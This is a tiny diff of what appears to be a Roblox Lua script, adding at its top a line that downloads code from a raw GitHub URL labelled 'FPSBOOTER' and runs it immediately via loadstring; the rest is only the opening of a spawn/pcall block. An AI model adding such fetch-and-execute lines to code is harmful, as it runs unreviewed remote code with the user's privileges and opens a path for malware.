@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCONCUBETI/Duongcutobeti/refs/heads/main/FPSBOOTER"))()
 
 spawn(function()
 	pcall(function()
